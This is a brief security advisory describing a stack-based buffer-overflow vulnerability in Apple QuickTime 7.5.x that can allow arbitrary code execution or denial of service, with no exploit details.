Apple QuickTime is prone to a stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

An attacker can exploit this issue to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely result in denial-of-service conditions.

QuickTime 7.5.x is vulnerable; other versions may also be affected.
